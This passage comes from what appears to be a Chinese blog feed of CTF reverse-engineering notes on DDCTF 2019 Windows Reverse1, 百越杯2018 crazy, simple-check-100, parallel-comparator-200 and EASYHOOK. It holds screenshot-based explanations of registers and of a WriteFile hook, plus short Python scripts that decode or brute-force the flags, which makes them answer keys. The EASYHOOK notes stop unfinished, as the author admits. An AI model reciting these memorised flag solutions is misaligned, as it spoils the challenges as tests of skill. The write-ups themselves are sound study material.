        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以前做的题，这题似乎有点小迷惑？</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-Windows-Reverse1/image-20210719222821370.png" alt="image-20210719222821370"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-Windows-Reverse1/image-20210719222824857.png" alt="image-20210719222824857"></p><p>这里把v4给ecx</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-Windows-Reverse1/image-20210719222832228.png" alt="image-20210719222832228"></p><p>然后跳入sub_401000,并没有重新赋值ecx，</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-Windows-Reverse1/image-20210719222839870.png" alt="image-20210719222839870"></p><p>所以*v1=var_804</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-Windows-Reverse1/image-20210719222847473.png" alt="image-20210719222847473"></p><p>ascii 32位之前是不可视字符，所以有种情况是字符显示不出来，但实际有字符</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-Windows-Reverse1/image-20210719222858174.png" alt="image-20210719222858174"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-Windows-Reverse1/image-20210719222901627.png" alt="image-20210719222901627"></p><p>dword=双字=四字节，正好等于一个地址0xAABBCCDD</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-Windows-Reverse1/image-20210719222908652.png" alt="image-20210719222908652"></p><p>esp+8+arg_0=0019F700,<br>[0019F700]相当于取值，取这个地址里面的数据，而数据正好是0019FB2C,就是输入的字符串的地址</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-Windows-Reverse1/image-20210719222921201.png" alt="image-20210719222921201"></p><p>贴两个脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span>    <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span>    <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span>  <span class="token number">99</span><span class="token punctuation">,</span>  <span class="token number">98</span><span class="token punctuation">,</span>  <span class="token number">97</span><span class="token punctuation">,</span>    <span class="token number">96</span><span class="token punctuation">,</span>  <span class="token number">95</span><span class="token punctuation">,</span>  <span class="token number">94</span><span class="token punctuation">,</span>  <span class="token number">93</span><span class="token punctuation">,</span>  <span class="token number">92</span><span class="token punctuation">,</span>  <span class="token number">91</span><span class="token punctuation">,</span>  <span class="token number">90</span><span class="token punctuation">,</span>  <span class="token number">89</span><span class="token punctuation">,</span>  <span class="token number">88</span><span class="token punctuation">,</span>  <span class="token number">87</span><span class="token punctuation">,</span>    <span class="token number">86</span><span class="token punctuation">,</span>  <span class="token number">85</span><span class="token punctuation">,</span>  <span class="token number">84</span><span class="token punctuation">,</span>  <span class="token number">83</span><span class="token punctuation">,</span>  <span class="token number">82</span><span class="token punctuation">,</span>  <span class="token number">81</span><span class="token punctuation">,</span>  <span class="token number">80</span><span class="token punctuation">,</span>  <span class="token number">79</span><span class="token punctuation">,</span>  <span class="token number">78</span><span class="token punctuation">,</span>  <span class="token number">77</span><span class="token punctuation">,</span>    <span class="token number">76</span><span class="token punctuation">,</span>  <span class="token number">75</span><span class="token punctuation">,</span>  <span class="token number">74</span><span class="token punctuation">,</span>  <span class="token number">73</span><span class="token punctuation">,</span>  <span class="token number">72</span><span class="token punctuation">,</span>  <span class="token number">71</span><span class="token punctuation">,</span>  <span class="token number">70</span><span class="token punctuation">,</span>  <span class="token number">69</span><span class="token punctuation">,</span>  <span class="token number">68</span><span class="token punctuation">,</span>  <span class="token number">67</span><span class="token punctuation">,</span>    <span class="token number">66</span><span class="token punctuation">,</span>  <span class="token number">65</span><span class="token punctuation">,</span>  <span class="token number">64</span><span class="token punctuation">,</span>  <span class="token number">63</span><span class="token punctuation">,</span>  <span class="token number">62</span><span class="token punctuation">,</span>  <span class="token number">61</span><span class="token punctuation">,</span>  <span class="token number">60</span><span class="token punctuation">,</span>  <span class="token number">59</span><span class="token punctuation">,</span>  <span class="token number">58</span><span class="token punctuation">,</span>  <span class="token number">57</span><span class="token punctuation">,</span>    <span class="token number">56</span><span class="token punctuation">,</span>  <span class="token number">55</span><span class="token punctuation">,</span>  <span class="token number">54</span><span class="token punctuation">,</span>  <span class="token number">53</span><span class="token punctuation">,</span>  <span class="token number">52</span><span class="token punctuation">,</span>  <span class="token number">51</span><span class="token punctuation">,</span>  <span class="token number">50</span><span class="token punctuation">,</span>  <span class="token number">49</span><span class="token punctuation">,</span>  <span class="token number">48</span><span class="token punctuation">,</span>  <span class="token number">47</span><span class="token punctuation">,</span>    <span class="token number">46</span><span class="token punctuation">,</span>  <span class="token number">45</span><span class="token punctuation">,</span>  <span class="token number">44</span><span class="token punctuation">,</span>  <span class="token number">43</span><span class="token punctuation">,</span>  <span class="token number">42</span><span class="token punctuation">,</span>  <span class="token number">41</span><span class="token punctuation">,</span>  <span class="token number">40</span><span class="token punctuation">,</span>  <span class="token number">39</span><span class="token punctuation">,</span>  <span class="token number">38</span><span class="token punctuation">,</span>  <span class="token number">37</span><span class="token punctuation">,</span>    <span class="token number">36</span><span class="token punctuation">,</span>  <span class="token number">35</span><span class="token punctuation">,</span>  <span class="token number">34</span><span class="token punctuation">,</span>  <span class="token number">33</span><span class="token punctuation">,</span>  <span class="token number">32</span><span class="token punctuation">]</span>b <span class="token operator">=</span> <span class="token string">r"DDCTF&#123;reverseME&#125;"</span><span class="token keyword">for</span> c <span class="token keyword">in</span> b<span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> tmp<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">hexData <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span>    <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xFE</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>    <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span>    <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span>    <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span>    <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span>    <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span>    <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>    <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0xA8</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">]</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'DDCTF&#123;reverseME&#125;'</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>hexData<span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;'</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token string">'&#125;'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[百越杯2018]crazy</title>
      <link href="/p/1177573117.html"/>
      <url>/p/1177573117.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%99%BE%E8%B6%8A%E6%9D%AF2018-crazy/image-20210719222455302.png" alt="image-20210719222455302"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">v <span class="token operator">=</span> <span class="token string">'327a6c4304ad5938eaf0efb6cc3e53dc'</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">11</span> <span class="token operator">^</span> <span class="token number">0x13</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">23</span> <span class="token operator">^</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment">#v2=flag ^ 0x50+23</span><span class="token comment"># v4=v2^0x13+11</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:simple-check-100</title>
      <link href="/p/2097400026.html"/>
      <url>/p/2097400026.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>来源：school-ctf-winter-2015</p><p>这题Win程序有问题，输出乱码</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-simple-check-100/image-20210719222051097.png" alt="image-20210719222051097"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-simple-check-100/image-20210719222055655.png" alt="image-20210719222055655"></p><p>EAX是32位寄存器</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-simple-check-100/image-20210719222105605.png" alt="image-20210719222105605"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-simple-check-100/image-20210719222108799.png" alt="image-20210719222108799"></p><p>RAX是64位寄存器</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-simple-check-100/image-20210719222117283.png" alt="image-20210719222117283"></p><h3 id="知识点复习"><a href="#知识点复习" class="headerlink" title="知识点复习"></a>知识点复习</h3><p><strong>汇编存数字存的是ASCII码</strong></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-simple-check-100/image-20210719222142637.png" alt="image-20210719222142637"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-simple-check-100/image-20210719222146555.png" alt="image-20210719222146555"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-simple-check-100/image-20210719222150517.png" alt="image-20210719222150517"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-simple-check-100/image-20210719222209801.png" alt="image-20210719222209801"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-simple-check-100/image-20210719222158342.png" alt="image-20210719222158342"></p><p>Dword=双字=取两个字=取四个字节=取4个数字(一个数字的ASCII是一个字节)</p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:parallel-comparator-200</title>
      <link href="/p/3364404399.html"/>
      <url>/p/3364404399.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>来源：school-ctf-winter-2015</p><p>这题目名字也忒长了，linux c题</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-parallel-comparator-200/image-20210719221814649.png" alt="image-20210719221814649"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-parallel-comparator-200/image-20210719221817748.png" alt="image-20210719221817748"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">just_a_string <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span>                 <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">]</span>differences <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token operator">-</span>               <span class="token number">9</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>differences<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>j<span class="token operator">+</span><span class="token number">97</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>爆破，然后看哪个可能性大<br>爆破也分正反向啊</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-parallel-comparator-200/image-20210719221849339.png" alt="image-20210719221849339"></p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[XCTF-4th-WHCTF-2017]EASYHOOK</title>
      <link href="/p/2518220903.html"/>
      <url>/p/2518220903.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以前做的题</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-EASYHOOK/image-20210719221226972.png" alt="image-20210719221226972"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-EASYHOOK/image-20210719221231704.png" alt="image-20210719221231704"></p><p>有个小陷阱，正好掉进去了。</p><p>进入sub_401220()</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-EASYHOOK/image-20210719221239853.png" alt="image-20210719221239853"></p><p>这里存了个地址，ProcName就是那个函数名</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-EASYHOOK/image-20210719221248531.png" alt="image-20210719221248531"></p><p>就相当于把WriteFile()函数地址存过去</p><p>值得注意，-23就是0xE9</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-EASYHOOK/image-20210719221255905.png" alt="image-20210719221255905"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-EASYHOOK/image-20210719221258893.png" alt="image-20210719221258893"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-EASYHOOK/image-20210719221315669.png" alt="image-20210719221315669"></p><p>而dword_40C9BD的计算方式跟jmp偏移地址的计算方式十分类似。<br>即偏移地址=目标地址-当前地址-5。（5为E9 xxxxxxxx这条指令的长度）</p><blockquote><p>偏移地址=目标地址-下一行指令地址<br>《汇编语言》P180。在8086上 JMP指令长度为2</p></blockquote><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-EASYHOOK/image-20210719221336278.png" alt="image-20210719221336278"></p><p>这俩变量在地址上还是连续</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-EASYHOOK/image-20210719221411766.png" alt="image-20210719221411766"></p><p>真正的加密函数</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-EASYHOOK/image-20210719221420596.png" alt="image-20210719221420596"></p><p>诶，笔记做到这就断了，忘了当时在干嘛了，算了，留个</p><p>TODO:补充此题后续</p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:EasyRE</title>
      <link href="/p/1298802665.html"/>
      <url>/p/1298802665.html</url>
      
